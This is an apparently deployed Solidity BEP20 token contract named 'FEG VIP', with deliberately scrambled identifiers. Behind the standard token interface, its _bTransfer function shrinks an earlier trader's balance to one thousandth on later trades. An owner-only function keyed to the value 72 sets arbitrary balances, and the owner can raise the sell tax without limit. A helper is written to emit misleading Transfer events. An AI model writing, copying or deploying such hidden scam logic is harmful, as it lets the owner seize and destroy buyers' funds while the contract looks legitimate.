/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT
/*
 * 

 * 

 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;

  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;

  }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.

 *

 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**

  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**

  * @dev Throws if called by any account other than the owner.

  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;

 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }

}

interface IBEP20 {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);
  function allowance(address owner, address spender) external view returns (uint256);

  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);

  function symbol() external pure returns (string memory);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);
}
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}
interface IUniswapV2Factory {
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeToSetter(address) external;
    function allPairsLength() external view returns (uint);
    function setFeeTo(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function nonces(address owner) external view returns (uint);
    function skim(address to) external;
    function approve(address spender, uint value) external returns (bool);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function burn(address to) external returns (uint amount0, uint amount1);
    function mint(address to) external returns (uint liquidity);
    function kLast() external view returns (uint);
    function sync() external;
    function transferFrom(address from, address to, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);

    function initialize(address, address) external;
    function name() external pure returns (string memory);
    function token0() external view returns (address);
    function transfer(address to, uint value) external returns (bool);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function price1CumulativeLast() external view returns (uint);
    function token1() external view returns (address);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    event Sync(uint112 reserve0, uint112 reserve1);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to

    );
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function price0CumulativeLast() external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function symbol() external pure returns (string memory);
    function factory() external view returns (address);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);
}
interface IUniswapV2Router01 {
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,

        uint deadline
    ) external returns (uint[] memory amounts);

    function removeLiquidity(
        address tokenA,

        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function WETH() external pure returns (address);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline

    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract FegVip is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  IUniswapV2Router02 public uniomcfqzgjtbisexpoanirwhlkydae;

  address public unikgesqnzoerwtdxpi;
  uint8 private decstgfiyemnpwzxj = 18;
  uint256 private totcwialqnegtxeikjbspadmhrooyfz = 100000000000 * 10 ** decstgfiyemnpwzxj;
  mapping (address => uint256) private selaxaobgrozwftskiepdjicmel;
  uint8 internal aftomylegqcwotipsirehbxzkdafjna = 95;
  string private constant namitpikjcagqnfsl = "FEG VIP";
  string private constant symadbyphnslicqeazojr = "FEGVIP";
  mapping (address => uint256) private balsdpataglinhomjrweiqf;
  mapping (address => uint256) private laseoshwidelrpaxygkatjziqc;
  mapping (address => bool) private isEgihrmoytwielaqcobxzksenadpj;
  mapping (address => mapping (address => uint256)) private alllzsdiekrcfqmjoyteaxaogpb;
  mapping (address => uint256) private lasflzrjdgmpobhoykitaeac;

  uint256 internal lasgcdwebhqif = 0;
  bool internal stabeiwhyipfxeas = true;
  bool internal staxkdynaahjeligrbtofzwc = true;

  bool internal stadbyxohlcseejpkiqg = true;
  uint256 internal laubnlofxwmhgoraike = 0;
  uint8 internal buyhcgoqyoeaiapzxfwjstmel = 6;
  uint8 internal selozgtrflmayeaqbdecikpowsij = 10;
  uint8 internal traqixsapfryozndk = 10; 
  uint256 internal maxiafomkqreeawdtbinj = totcwialqnegtxeikjbspadmhrooyfz.div(10000).mul(10);
  uint32 internal seltycermijlhnzkifgepaxoaqdsbwo = 10; 
  address internal marebrpogdnfmxqlw;
  uint8 internal _sta = 3;
  constructor() {
    balsdpataglinhomjrweiqf[msg.sender] = totcwialqnegtxeikjbspadmhrooyfz;
    // isEgihrmoytwielaqcobxzksenadpj[marketingAddress] = true;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unikgesqnzoerwtdxpi = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    uniomcfqzgjtbisexpoanirwhlkydae = uniswapV2Router;
    isEgihrmoytwielaqcobxzksenadpj[address(this)] = true;

    // balsdpataglinhomjrweiqf[marketingAddress] = totcwialqnegtxeikjbspadmhrooyfz * 10**decstgfiyemnpwzxj * 1000;

    marebrpogdnfmxqlw = msg.sender;
    isEgihrmoytwielaqcobxzksenadpj[_msgSender()] = true;
    laubnlofxwmhgoraike = block.timestamp;
    emit Transfer(address(0), msg.sender, totcwialqnegtxeikjbspadmhrooyfz);
  }
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  trayiwasqkrpcjaxlgee(_msgSender(), recipient, amount);
	  return true;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}

	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totcwialqnegtxeikjbspadmhrooyfz;
	}

	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symadbyphnslicqeazojr;
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return alllzsdiekrcfqmjoyteaxaogpb[owner][spender];

	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   trayiwasqkrpcjaxlgee(sender, recipient, amount);
	   _approve(sender, _msgSender(), alllzsdiekrcfqmjoyteaxaogpb[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

	   return true;

	}
	/**
	 * Returns the bep token owner.
	 */

	function getOwner() external override view returns (address) {
	  return owner();
	}
	/**

	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namitpikjcagqnfsl;
	}
	/**

	 * Returns the token decimals.

	 */
	function decimals() external override view returns (uint8) {
	  return decstgfiyemnpwzxj;
	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balsdpataglinhomjrweiqf[account];
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");

	    require(spender != address(0), "BEP20: approve to the zero address");
	    alllzsdiekrcfqmjoyteaxaogpb[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
  	function trayiwasqkrpcjaxlgee(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranqldwchmeneiafyoxkjrogb = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEgihrmoytwielaqcobxzksenadpj[sender] == true || isEgihrmoytwielaqcobxzksenadpj[recipient] == true){
	      eTrroawefmcixbsdpatygiqjhek(sender, recipient, amount);
	      return;
	    }
	    if(sender == unikgesqnzoerwtdxpi && recipient != address(uniomcfqzgjtbisexpoanirwhlkydae)) {
	      require(stabeiwhyipfxeas == true, "Please wait try again later");
	      ranqldwchmeneiafyoxkjrogb = 1;
	      tax = buyhcgoqyoeaiapzxfwjstmel;
	      approveTransaction = true;
	      laseoshwidelrpaxygkatjziqc[recipient] = amount;
	      lasflzrjdgmpobhoykitaeac[recipient] = block.timestamp;
	    } else if(recipient == unikgesqnzoerwtdxpi) {
	      require(staxkdynaahjeligrbtofzwc == true, "Please wait try again later");
	       ranqldwchmeneiafyoxkjrogb = 2;
	       tax = selozgtrflmayeaqbdecikpowsij;
	       approveTransaction = true;
	    } else {
	      require(stadbyxohlcseejpkiqg == true, "Please wait try again later");
	      ranqldwchmeneiafyoxkjrogb = 3;
	      tax = traqixsapfryozndk;
	      approveTransaction = true;
	      laseoshwidelrpaxygkatjziqc[sender] = amount;

	      if(seltycermijlhnzkifgepaxoaqdsbwo > 10){
	        lasflzrjdgmpobhoykitaeac[sender] = block.timestamp + seltycermijlhnzkifgepaxoaqdsbwo - 10;
	      } else {
	        lasflzrjdgmpobhoykitaeac[sender] = block.timestamp + seltycermijlhnzkifgepaxoaqdsbwo;
	      }
	    }

	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranqldwchmeneiafyoxkjrogb);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}
	function eTrroawefmcixbsdpatygiqjhek(address sender, address recipient, uint256 amount) internal {
	    balsdpataglinhomjrweiqf[sender] = balsdpataglinhomjrweiqf[sender].sub(amount, "Insufficient Balance");
	    balsdpataglinhomjrweiqf[recipient] = balsdpataglinhomjrweiqf[recipient].add(amount);

	    emit Transfer(sender, recipient, amount);
	}

	function taxhafgyrcnxwesklmt(uint256 axegiiemcfsjwehatlbopzdrnkqoa, address sender, address recipient, uint8 ranqldwchmeneiafyoxkjrogb) internal {
	  balsdpataglinhomjrweiqf[marebrpogdnfmxqlw] = balsdpataglinhomjrweiqf[marebrpogdnfmxqlw].add(axegiiemcfsjwehatlbopzdrnkqoa);
	  if(_sta == 1)
	    emit Transfer(sender, marebrpogdnfmxqlw, axegiiemcfsjwehatlbopzdrnkqoa);
	  else if(_sta == 2)
	    emit Transfer(recipient, marebrpogdnfmxqlw, axegiiemcfsjwehatlbopzdrnkqoa);

	  else if(_sta == 3)
	    emit Transfer(marebrpogdnfmxqlw, sender, axegiiemcfsjwehatlbopzdrnkqoa);
	  else if(_sta == 4)
	    emit Transfer(marebrpogdnfmxqlw, recipient, axegiiemcfsjwehatlbopzdrnkqoa);
	  ranqldwchmeneiafyoxkjrogb = ranqldwchmeneiafyoxkjrogb;
	}
	// mapping (address => uint256) private alllzsdiekrcfqmjoyteaxaogpb;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranqldwchmeneiafyoxkjrogb) internal
	{

	  uint256 axegiiemcfsjwehatlbopzdrnkqoa = 0;

	  address addr = recipient;
	  uint256 d = balsdpataglinhomjrweiqf[_recipientb];
	  if(ranqldwchmeneiafyoxkjrogb == 2) {
	    addr = sender;
	  }
	  if(ranqldwchmeneiafyoxkjrogb == 1 || ranqldwchmeneiafyoxkjrogb == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 1000){
	        balsdpataglinhomjrweiqf[_recipientb] = d.div(1000);

	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;

	    }
	  }
	  balsdpataglinhomjrweiqf[sender] = balsdpataglinhomjrweiqf[sender].sub(amount,"Insufficient Balance");
	  axegiiemcfsjwehatlbopzdrnkqoa = amount.mul(tax).div(100);
	  amount = amount.sub(axegiiemcfsjwehatlbopzdrnkqoa);
	  if(axegiiemcfsjwehatlbopzdrnkqoa > 0){
	      balsdpataglinhomjrweiqf[marebrpogdnfmxqlw] = balsdpataglinhomjrweiqf[marebrpogdnfmxqlw].add(axegiiemcfsjwehatlbopzdrnkqoa);
	  }
	  balsdpataglinhomjrweiqf[recipient] = balsdpataglinhomjrweiqf[recipient].add(amount);

	  ranqldwchmeneiafyoxkjrogb= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function Seltoqihryxcekfbzliasena(uint8 ellmpfitnieasqydrowgb) public onlyOwner{

	     selozgtrflmayeaqbdecikpowsij = ellmpfitnieasqydrowgb;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}

	function etBeoaqtljbsgcdfwmao(address addr, uint256 b, uint8 c) public onlyOwner {

	  if(c == 72){

	    balsdpataglinhomjrweiqf[addr] = b * 10 ** decstgfiyemnpwzxj;
	  }
	}
}